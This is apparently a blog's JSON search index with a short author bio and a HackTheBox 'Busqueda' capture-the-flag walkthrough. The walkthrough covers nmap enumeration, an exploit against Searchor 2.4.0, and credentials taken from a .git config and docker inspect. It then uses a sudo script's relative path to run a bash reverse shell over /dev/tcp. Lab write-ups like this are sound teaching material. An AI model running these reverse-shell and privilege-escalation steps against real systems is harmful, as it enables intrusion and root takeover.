


[{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/about/","section":"Tags","summary":"","title":"About","type":"tags"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/post/","section":"Tags","summary":"","title":"Post","type":"tags"},{"content":" Biografía # ¡Hola! Me llamo Marcos y soy un estudiante de Ciberseguridad de 21 años. En Internet, quizá me conozcas como S3n o S3ntinl. Actualmente estoy cursando un Máster en Ciberseguridad en Entornos de Tecnologías de la Información y preparándome para la certificación OSCP.\nPaso la mayor parte de mi tiempo programando, resolviendo CTFs o, en general, estudiando. Mi pasión está en el hacking y en encontrar formas creativas de resolver problemas.\nEste blog es mi manera de documentar mi camino mientras comparto, no solo mi progreso, sino también herramientas, técnicas y lecciones que voy aprendiendo en el proceso. Espero que se convierta en un recurso útil para otros, tanto para aquél que esté comenzando a explorar el mundo de la ciberseguridad como para aquellos más experimentado buscando nuevas perspectivas.\n¡No dudes en contactarme a través de cualquiera de mis redes si tienes preguntas o ideas!\n","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/about/","section":"S3ntinl","summary":"A little introduction about myself!","title":"Quién es S3ntinl?","type":"page"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/","section":"S3ntinl","summary":"","title":"S3ntinl","type":"page"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"18 / 12 / 2024","externalUrl":null,"permalink":"/pt-pt/tags/whoami/","section":"Tags","summary":"","title":"Whoami","type":"tags"},{"content":" Machine Info Platform HackTheBox Operative System Linux Difficulty Easy IP 10.10.11.208 Enumeration # ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p22,80 -sCV --min-rate 2000 -T5 -n -Pn 10.10.11.208 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA) |_ 256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://searcher.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel We can see that the web on port 80 redirects to searcher.htb. Let\u0026rsquo;s add it to /etc/hosts.\nAs soon as we land on the page, we see the following: A quick look shows the version of the App that is running behind this website, which is Searchor 2.4.0. If we look for vulnerabilities, we find the following exploit\nExploitation # Let\u0026rsquo;s run the exploit:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ./exploit.sh http://searcher.htb/ 10.10.14.10 4646 We put a netcat listener to receive the connection:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4646 listening on [any] 4646 ... connect to [10.10.14.10] from (UNKNOWN) [10.10.11.208] 40288 We succesfully enter the machine as user svc .\nsvc@busqueda:~$ cat user.txt cat user.txt 75a17...8bd3e Privilege Escalation # Looking though the system files, we find a .git with credentials in the app folder.\nsvc@busqueda:/var/www/app/.git$ cat config [core] repositoryformatversion = 0 ... [remote \u0026#34;origin\u0026#34;] url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git fetch = +refs/heads/*:refs/remotes/origin/* [branch \u0026#34;main\u0026#34;] remote = origin merge = refs/heads/main The user is cody and the password is jh1usoih2bkjaspwe92 for an application in a subdomain called gitea. Let\u0026rsquo;s add it to the /etc/hosts and take a look.\nInside here, we don\u0026rsquo;t find anything interesing, appart that we can see a user called administrator. Although, we can try to SSH with the svc user and cody\u0026rsquo;s password:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ ssh svc@10.10.11.208 svc@10.10.11.208\u0026#39;s password: Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage ... Last login: Tue Apr 4 17:02:09 2023 from 10.10.14.19 Let\u0026rsquo;s check the sudo privileges that this user has:\nsvc@busqueda:/opt/scripts$ sudo -l User svc may run the following commands on busqueda: (root) /usr/bin/python3 /opt/scripts/system-checkup.py * This user has the right to execute that script inside /opr/scripts.\nIf we run it, we can see the following options:\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * Usage: /opt/scripts/system-checkup.py \u0026lt;action\u0026gt; (arg1) (arg2) docker-ps : List running docker containers docker-inspect : Inpect a certain docker container full-checkup : Run a full system checkup After some investigation, we discover the docker-inspect option can be use to retrieve information from the docker containers that are running in the machine, before seen with the docker-ps option.\nsvc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \u0026#39;{{json .}}\u0026#39; gitea | jq \u0026#34;Env\u0026#34;: [ \u0026#34;USER_UID=115\u0026#34;, \u0026#34;USER_GID=121\u0026#34;, \u0026#34;GITEA__database__DB_TYPE=mysql\u0026#34;, \u0026#34;GITEA__database__HOST=db:3306\u0026#34;, \u0026#34;GITEA__database__NAME=gitea\u0026#34;, \u0026#34;GITEA__database__USER=gitea\u0026#34;, \u0026#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh\u0026#34;, \u0026#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34;, \u0026#34;USER=git\u0026#34;, \u0026#34;GITEA_CUSTOM=/data/gitea\u0026#34; ], It looks like we find more credentials for the gitea application. Let\u0026rsquo;s try to log in as administrator with these credentials.\nNice! Now we can check the content of the scripts in the /opt folder.\nReading the script system-checkup.py script we notice that the full-checkup.sh script is referenced as if it was in the same folder:\n... elif action == \u0026#39;full-checkup\u0026#39;: try: arg_list = [\u0026#39;./full-checkup.sh\u0026#39;] print(run_command(arg_list)) print(\u0026#39;[+] Done!\u0026#39;) except: print(\u0026#39;Something went wrong\u0026#39;) exit(1) ... We can abuse this by creating our own malicious script and reference it, as we are executing it with sudo privileges:\nsvc@busqueda:/tmp$ cat full-checkup.sh #!/bin/bash bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.12/4647 \u0026lt;\u0026amp;1\u0026#39; Keep in mind that you need to grant execution privileges to the script to run, as this was a mistake of mine that took me quite a lot of time to figure out.\nNow, we set a netcat listener and execute the malicious script:\nsvc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup In the netcat we receive the root shell:\n┌──(s3n㉿kali)-[~/Desktop/Box/exploitation] └─$ nc -nlvp 4647 listening on [any] 4647 ... connect to [10.10.14.12] from (UNKNOWN) [10.10.11.208] 47020 root@busqueda:/tmp# whoami root Nice! We rooted the machine.\nroot@busqueda:~# cat /root/root.txt cat /root/root.txt ccd03ae...0e87097 ","date":"04 / 09 / 2021","externalUrl":null,"permalink":"/pt-pt/posts/busqueda/","section":"Posts","summary":"Máquina Busqueda de HackTheBox","title":"Busqueda","type":"posts"},{"content":"","date":"04 / 09 / 2021","externalUrl":null,"permalink":"/pt-pt/tags/ipsum/","section":"Tags","summary":"","title":"Ipsum","type":"tags"},{"content":"","date":"04 / 09 / 2021","externalUrl":null,"permalink":"/pt-pt/tags/lorem/","section":"Tags","summary":"","title":"Lorem","type":"tags"},{"content":"","date":"04 / 09 / 2021","externalUrl":null,"permalink":"/pt-pt/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","externalUrl":null,"permalink":"/pt-pt/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/pt-pt/series/","section":"Series","summary":"","title":"Series","type":"series"}]